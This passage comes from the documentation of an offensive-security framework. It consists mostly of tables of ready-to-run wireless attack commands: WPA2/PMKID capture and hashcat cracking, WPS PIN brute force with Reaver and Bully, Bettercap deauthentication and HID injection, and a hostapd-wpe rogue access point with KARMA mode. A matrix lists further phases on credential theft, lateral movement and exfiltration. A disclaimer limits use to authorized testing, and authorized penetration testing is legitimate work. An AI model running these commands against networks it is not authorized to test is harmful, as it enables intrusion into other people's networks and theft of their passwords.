| 6 | Channel Filter | `wifite -i {interface} -c 1,6,11 > /opt/tsec/output/10.2.6_wifite_channel.txt` | TXT |
| 7 | Power Filter | `wifite -i {interface} --pow 50 > /opt/tsec/output/10.2.7_wifite_power.txt` | TXT |
| 8 | Cracked Check | `wifite --cracked > /opt/tsec/output/10.2.8_wifite_cracked.txt` | TXT |
| 9 | Handshake Verify | `wifite --check {capture_file} > /opt/tsec/output/10.2.9_wifite_verify.txt` | TXT |
| 10 | Full Assessment | `wifite --kill --wpa --wps --pmkid --dict {wordlist} -p 30 > /opt/tsec/output/10.2.10_wifite_full.txt` | TXT |

## Tool 10.3 — hcxtools
*WLAN attack and capture tools for PMKID and handshake cracking.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | PMKID Capture | `hcxdumptool -i {interface} -o /opt/tsec/output/10.3.1_hcxdump_pmkid.pcapng --enable_status=15` | PCAPNG |
| 2 | Convert Hashcat | `hcxpcapngtool -o /opt/tsec/output/10.3.2_hcxconv_hash.22000 -E /opt/tsec/output/10.3.2_hcxconv_essid.txt {capture}.pcapng` | 22000 |
| 3 | Filter BSSID | `hcxpcapngtool -o /opt/tsec/output/10.3.3_hcxconv_filtered.22000 --filtermode=2 --filterlist={bssid_file} {capture}` | 22000 |
| 4 | MAC Filter | `hcxdumptool -i {iface} -o /opt/tsec/output/10.3.4_hcxdump_mac.pcapng --filterlist_ap={mac_file} --filtermode=2` | PCAPNG |
| 5 | Client-less | `hcxdumptool -i {iface} -o /opt/tsec/output/10.3.5_hcxdump_clientless.pcapng --enable_status=1 --active_beacon` | PCAPNG |
| 6 | Channel Assessment | `hcxdumptool -i {iface} -o /opt/tsec/output/10.3.6_hcxdump_assess.pcapng --do_rcascan` | PCAPNG |
| 7 | GPS Logging | `hcxdumptool -i {iface} -o /opt/tsec/output/10.3.7_hcxdump_gps.pcapng --use_gpsd=localhost:2947` | PCAPNG |
| 8 | Hash Info | `hcxhashtool -i {hash}.22000 --info=stdout > /opt/tsec/output/10.3.8_hcxhashtool_info.txt` | TXT |
| 9 | ESSID Extract | `hcxpcapngtool -o {hash}.22000 -E /opt/tsec/output/10.3.9_hcxconv_essidlist.txt --essid=stdout {capture} > /opt/tsec/output/10.3.9_hcxconv_essids.txt` | TXT |
| 10 | Full Pipeline | `hcxdumptool -i {iface} -o /opt/tsec/output/10.3.10_hcxdump_full.pcapng --enable_status=15 --active_beacon --channel=1,6,11 && hcxpcapngtool -o /opt/tsec/output/10.3.10_hcxconv_full.22000 /opt/tsec/output/10.3.10_hcxdump_full.pcapng` | 22000 |

## Tool 10.4 — hashcat (Wi-Fi Modes)
*GPU-accelerated Wi-Fi password cracking.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | WPA2 Crack | `hashcat -m 2500 -a 0 {capture}.hccapx {wordlist} -o /opt/tsec/output/10.4.1_hashcat_wpa2.txt` | TXT |
| 2 | PMKID Crack | `hashcat -m 22000 -a 0 {hash}.22000 {wordlist} -o /opt/tsec/output/10.4.2_hashcat_pmkid.txt` | TXT |
| 3 | Mask Attack | `hashcat -m 22000 -a 3 {hash}.22000 '?u?l?l?l?l?d?d?d?d' -o /opt/tsec/output/10.4.3_hashcat_mask.txt` | TXT |
| 4 | Rules Attack | `hashcat -m 22000 -a 0 {hash}.22000 {wordlist} -r {rules} -o /opt/tsec/output/10.4.4_hashcat_rules.txt` | TXT |
| 5 | Brute Force | `hashcat -m 22000 -a 3 {hash}.22000 '?a?a?a?a?a?a?a?a' -o /opt/tsec/output/10.4.5_hashcat_brute.txt` | TXT |
| 6 | Session Save | `hashcat -m 22000 -a 0 {hash}.22000 {wordlist} -o /opt/tsec/output/10.4.6_hashcat_cracked.txt --session={name}` | TXT |
| 7 | Show Cracked | `hashcat -m 22000 {hash}.22000 --show > /opt/tsec/output/10.4.7_hashcat_show.txt` | TXT |
| 8 | Benchmark | `hashcat -m 22000 -b > /opt/tsec/output/10.4.8_hashcat_benchmark.txt` | TXT |
| 9 | Multi Wordlist | `hashcat -m 22000 -a 0 {hash}.22000 {wordlist1} {wordlist2} -o /opt/tsec/output/10.4.9_hashcat_multi.txt` | TXT |
| 10 | Optimized Crack | `hashcat -m 22000 -a 0 {hash}.22000 {wordlist} -O -w 3 -o /opt/tsec/output/10.4.10_hashcat_optimized.txt` | TXT |

## Tool 10.5 — Reaver
*WPS PIN brute-forcing to recover WPA/WPA2 passphrases.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Attack | `reaver -i {interface} -b {bssid} -vv > /opt/tsec/output/10.5.1_reaver_basic.txt` | TXT |
| 2 | Channel Lock | `reaver -i {interface} -b {bssid} -c {channel} -vv > /opt/tsec/output/10.5.2_reaver_channel.txt` | TXT |
| 3 | Rate Limit | `reaver -i {interface} -b {bssid} -d 5 -vv > /opt/tsec/output/10.5.3_reaver_delay.txt` | TXT |
| 4 | Custom PIN | `reaver -i {interface} -b {bssid} -p {pin} -vv > /opt/tsec/output/10.5.4_reaver_pin.txt` | TXT |
| 5 | MAC Spoof | `reaver -i {interface} -b {bssid} -vv -N -n > /opt/tsec/output/10.5.5_reaver_nospoof.txt` | TXT |
| 6 | Timeout | `reaver -i {interface} -b {bssid} -t 30 -x 60 -vv > /opt/tsec/output/10.5.6_reaver_timeout.txt` | TXT |
| 7 | Session Resume | `reaver -i {interface} -b {bssid} -s {session_file} -vv > /opt/tsec/output/10.5.7_reaver_resume.txt` | TXT |
| 8 | Ignore Locks | `reaver -i {interface} -b {bssid} -L -vv > /opt/tsec/output/10.5.8_reaver_ignore.txt` | TXT |
| 9 | Pixie Dust | `reaver -i {interface} -b {bssid} -vv -K 1 > /opt/tsec/output/10.5.9_reaver_pixie.txt` | TXT |
| 10 | Full WPS | `reaver -i {interface} -b {bssid} -c {ch} -vv -K 1 -t 30 -d 5 -L > /opt/tsec/output/10.5.10_reaver_full.txt` | TXT |

## Tool 10.6 — Bully
*Modern, efficient WPS brute-forcing tool.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Attack | `bully -b {bssid} -c {channel} {interface} > /opt/tsec/output/10.6.1_bully_basic.txt` | TXT |
| 2 | Verbose | `bully -b {bssid} -c {channel} -v 3 {interface} > /opt/tsec/output/10.6.2_bully_verbose.txt` | TXT |
| 3 | Force Mode | `bully -b {bssid} -c {channel} -F {interface} > /opt/tsec/output/10.6.3_bully_force.txt` | TXT |
| 4 | Custom PIN | `bully -b {bssid} -c {channel} -p {pin} {interface} > /opt/tsec/output/10.6.4_bully_pin.txt` | TXT |
| 5 | Session Restore | `bully -b {bssid} -s {session_file} {interface} > /opt/tsec/output/10.6.5_bully_resume.txt` | TXT |
| 6 | Brute Force | `bully -b {bssid} -c {channel} -B {interface} > /opt/tsec/output/10.6.6_bully_brute.txt` | TXT |
| 7 | No Random MAC | `bully -b {bssid} -c {channel} -R {interface} > /opt/tsec/output/10.6.7_bully_norandom.txt` | TXT |
| 8 | Wireless Retry | `bully -b {bssid} -c {channel} -r {retries} {interface} > /opt/tsec/output/10.6.8_bully_retry.txt` | TXT |
| 9 | Detect Mode | `bully -b {bssid} -c {channel} -o /opt/tsec/output/10.6.9_bully_detect.txt {interface}` | TXT |
| 10 | Full Attack | `bully -b {bssid} -c {channel} -v 3 -F -B -o /opt/tsec/output/10.6.10_bully_full.txt {interface}` | TXT |

## Tool 10.7 — Bettercap (Wireless)
*Network attack and monitoring framework with wireless capabilities.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | WiFi Scan | `bettercap -iface {interface} -eval 'wifi.recon on; wifi.show' > /opt/tsec/output/10.7.1_bettercap_wifi.txt` | TXT |
| 2 | PMKID Capture | `bettercap -iface {interface} -eval 'wifi.recon on; wifi.assoc {bssid}' > /opt/tsec/output/10.7.2_bettercap_pmkid.txt` | TXT |
| 3 | Deauth Attack | `bettercap -iface {interface} -eval 'wifi.recon on; wifi.deauth {bssid}' > /opt/tsec/output/10.7.3_bettercap_deauth.txt` | TXT |
| 4 | Handshake Capture | `bettercap -iface {interface} -eval 'wifi.recon on; set wifi.handshakes.file /opt/tsec/output/10.7.4_bettercap_handshakes.pcap' > /opt/tsec/output/10.7.4_bettercap_handshake.txt` | TXT |
| 5 | BLE Scan | `bettercap -eval 'ble.recon on; ble.show' > /opt/tsec/output/10.7.5_bettercap_ble.txt` | TXT |
| 6 | HID Injection | `bettercap -eval 'hid.inject {script}' > /opt/tsec/output/10.7.6_bettercap_hid.txt` | TXT |
| 7 | MouseJack | `bettercap -eval 'hid.scan; hid.sniff; hid.inject {script}' > /opt/tsec/output/10.7.7_bettercap_mousejack.txt` | TXT |
| 8 | Channel Hop | `bettercap -iface {interface} -eval 'wifi.recon on; wifi.channel 1,6,11' > /opt/tsec/output/10.7.8_bettercap_channel.txt` | TXT |
| 9 | Save Capture | `bettercap -iface {interface} -eval 'wifi.recon on; set wifi.handshakes.file /opt/tsec/output/10.7.9_bettercap.pcap' > /opt/tsec/output/10.7.9_bettercap_save.txt` | TXT |
| 10 | Full Assessment | `bettercap -iface {interface} -eval 'wifi.recon on; wifi.channel 1,6,11; wifi.assoc all; set wifi.handshakes.file /opt/tsec/output/10.7.10_bettercap_full.pcap' > /opt/tsec/output/10.7.10_bettercap_full.txt` | TXT |

## Tool 10.8 — hostapd-wpe
*Rogue access point for enterprise wireless attacks.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Rogue AP | `hostapd-wpe {config_file} > /opt/tsec/output/10.8.1_hostapd_rogue.log` | LOG |
| 2 | SSID Spoof | `sed -i 's/^ssid=.*/ssid={target_ssid}/' /etc/hostapd-wpe/hostapd-wpe.conf && hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf > /opt/tsec/output/10.8.2_hostapd_spoof.log` | LOG |
| 3 | Channel Setup | `hostapd-wpe -c {channel} {config_file} > /opt/tsec/output/10.8.3_hostapd_channel.log` | LOG |
| 4 | KARMA Mode | `hostapd-wpe --karma {config_file} > /opt/tsec/output/10.8.4_hostapd_karma.log` | LOG |
| 5 | EAP Mode | `hostapd-wpe --eap {config_file} > /opt/tsec/output/10.8.5_hostapd_eap.log` | LOG |
| 6 | Log Output | `hostapd-wpe -o /opt/tsec/output/10.8.6_hostapd.log {config_file}` | LOG |
| 7 | Certificate Config | `hostapd-wpe --cert {cert_file} --key {key_file} {config} > /opt/tsec/output/10.8.7_hostapd_cert.log` | LOG |
| 8 | Broadcast SSID | `hostapd-wpe --broadcast {config_file} > /opt/tsec/output/10.8.8_hostapd_broadcast.log` | LOG |
| 9 | Hash Analysis | `cat {log_file} \| grep 'jnettop' \| asleap -C {challenge} -R {response} -W {wordlist} > /opt/tsec/output/10.8.9_hostapd_analysis.txt` | TXT |
| 10 | Full Enterprise | `hostapd-wpe --karma --eap -o /opt/tsec/output/10.8.10_hostapd_full.log {config} && asleap -C {chall} -R {resp} -W {wordlist} > /opt/tsec/output/10.8.10_hostapd_crack.txt` | TXT |

## Tool 10.9 — asleap
*LEAP and MS-CHAPv2 wireless authentication password recovery.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Crack | `asleap -C {challenge} -R {response} -W {wordlist} > /opt/tsec/output/10.9.1_asleap_crack.txt` | TXT |
| 2 | Generate Table | `asleap -G -W {wordlist} -D /opt/tsec/output/10.9.2_asleap_table.dat > /opt/tsec/output/10.9.2_asleap_generate.txt` | TXT |
| 3 | Table Lookup | `asleap -C {challenge} -R {response} -D /opt/tsec/output/10.9.2_asleap_table.dat > /opt/tsec/output/10.9.3_asleap_lookup.txt` | TXT |
| 4 | Pcap Extract | `asleap -r {capture}.pcap -W {wordlist} > /opt/tsec/output/10.9.4_asleap_pcap.txt` | TXT |
| 5 | SSID Filter | `asleap -r {capture}.pcap -W {wordlist} -S {ssid} > /opt/tsec/output/10.9.5_asleap_ssid.txt` | TXT |
| 6 | LEAP Attack | `asleap -C {challenge} -R {response} -W {wordlist} -L > /opt/tsec/output/10.9.6_asleap_leap.txt` | TXT |
| 7 | Verbose | `asleap -C {challenge} -R {response} -W {wordlist} -v > /opt/tsec/output/10.9.7_asleap_verbose.txt` | TXT |
| 8 | Multiple Wordlists | `asleap -C {challenge} -R {response} -W {wordlist1} -W {wordlist2} > /opt/tsec/output/10.9.8_asleap_multi.txt` | TXT |
| 9 | Pcap Batch | `asleap -r {capture}.pcap -W {wordlist} -o /opt/tsec/output/10.9.9_asleap_batch.txt` | TXT |
| 10 | Full Pipeline | `asleap -r {capture}.pcap -W {wordlist} -D {precomputed} -o /opt/tsec/output/10.9.10_asleap_full.txt -v` | TXT |

## Tool 10.10 — hcxdumptool
*Packet capture from WLAN devices for hashcat cracking.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Capture | `hcxdumptool -i {interface} -o /opt/tsec/output/10.10.1_hcxdump_basic.pcapng` | PCAPNG |
| 2 | Status Display | `hcxdumptool -i {interface} -o /opt/tsec/output/10.10.2_hcxdump_status.pcapng --enable_status=15` | PCAPNG |
| 3 | AP Filter | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.3_hcxdump_filter.pcapng --filterlist_ap={mac_file} --filtermode=2` | PCAPNG |
| 4 | Active Beacon | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.4_hcxdump_beacon.pcapng --active_beacon` | PCAPNG |
| 5 | Client Deauth | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.5_hcxdump_deauth.pcapng --enable_status=15 --bpfc={bssid}` | PCAPNG |
| 6 | Channel List | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.6_hcxdump_channels.pcapng --channel=1,6,11` | PCAPNG |
| 7 | Channel Assessment | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.7_hcxdump_assess.pcapng --do_rcascan` | PCAPNG |
| 8 | Extended Status | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.8_hcxdump_extended.pcapng --enable_status=63` | PCAPNG |
| 9 | GPS Tracking | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.9_hcxdump_gps.pcapng --use_gpsd=localhost:2947` | PCAPNG |
| 10 | Full Assessment | `hcxdumptool -i {iface} -o /opt/tsec/output/10.10.10_hcxdump_full.pcapng --enable_status=15 --active_beacon --channel=1,6,11 && hcxpcapngtool -o /opt/tsec/output/10.10.10_hcxconv_full.22000 /opt/tsec/output/10.10.10_hcxdump_full.pcapng` | 22000 |

---

## Quick Reference Matrix

### Command Index by Phase

| Phase | Phase Name | Tool Count | Command Count | Primary Purpose |
|-------|-----------|------------|---------------|-----------------|
| 1 | Reconnaissance | 10 | 100 | Passive/active intelligence gathering |
| 2 | Attack Surface Mapping | 10 | 100 | Network discovery and service enumeration |
| 3 | Vulnerability Assessment | 10 | 100 | Automated vulnerability scanning and validation |
| 4 | Payload Development & Delivery | 10 | 100 | Implant creation and payload delivery |
| 5 | Privilege Escalation | 10 | 100 | Elevating access rights on compromised systems |
| 6 | Credential Access | 10 | 100 | Stealing passwords, hashes, and Kerberos tickets |
| 7 | Lateral Movement | 10 | 100 | Moving between systems in the target network |
| 8 | Persistence & Defense Evasion | 10 | 100 | Maintaining access and avoiding detection |
| 9 | Actions on Objectives | 10 | 100 | Data collection, exfiltration, and impact |
| 10 | Wireless Hacking | 10 | 100 | Wi-Fi, Bluetooth, and RF security assessment |

### Tool Naming Convention

```
{Phase}.{Tool}.{Mode}

Example: 6.1.1 = Phase 6, Tool 1, Mode 1
         (Credential Access, Mimikatz, Logon Passwords)
```

### Output Naming Convention

```
/opt/tsec/output/{Phase}.{Tool}.{Mode}_{tool_name}_{target}.{ext}

Example: /opt/tsec/output/6.1.1_mimikatz_passwords.txt
```

---

## Usage Notes

### Interactive Menu Navigation

- **Up**: `u` or `Up Arrow`
- **Down**: `j` or `Down Arrow`
- **Back/Previous**: `h`, `q`, `<` or `Left Arrow`
- **Select/Next**: `k`, `Enter`, or `Right Arrow`
- **Exit**: `x`
- **Home**: `#`

### Graceful Interrupts

If a tool is taking too long to execute, you can safely press `Ctrl+C`. The framework will stop the running tool, preserve the data gathered so far, and return you back to the interactive menu without exiting the entire framework. Pressing `Ctrl+C` while in the menu will exit the framework and trigger the anonymity teardown sequence.

### Prerequisites

- All tools must be installed and accessible in `$PATH`
- Required directories must exist:
  ```bash
  sudo mkdir -p /opt/tsec/{output,wordlists,scripts,configs,tools,projects}
  ```

### Placeholder Variables

| Placeholder | Description |
|-------------|-------------|
| `{target}` | Target IP address, hostname, or URL |
| `{domain}` | Target domain name |
| `{lhost}` | Attacker/listener IP address |
| `{lport}` | Attacker/listener port |
| `{port}` | Target port number |
| `{interface}` | Network interface (e.g., wlan0, eth0) |
| `{wordlist}` | Path to wordlist file |
| `{user}` / `{username}` | Username for authentication |
| `{password}` | Password for authentication |
| `{hash}` / `{ntlm_hash}` | Password hash for pass-the-hash |
| `{payload}` | Path to payload file |
| `{shellcode}` | Path to shellcode file |
| `{bssid}` | Wi-Fi access point MAC address |
| `{channel}` | Wi-Fi channel number |
| `{session}` | Active session identifier |
| `{agent}` | Empire/Mythic agent name |
| `{pid}` | Process ID |

### Important Disclaimers

> **WARNING: This framework is designed exclusively for authorized security testing.**
>
> - Unauthorized access to computer systems is illegal under various laws including the Computer Fraud and Abuse Act (CFAA)
> - Always obtain written authorization before testing any system
> - Use these tools only on systems you own or have explicit permission to test
> - The authors assume no liability for misuse of this framework

---

*The TSEC Framework — Version 2.0.0*
*Last Updated: 2026-06-30*
*Total Coverage: 10 Phases | 100 Tools | 1,000+ Commands*
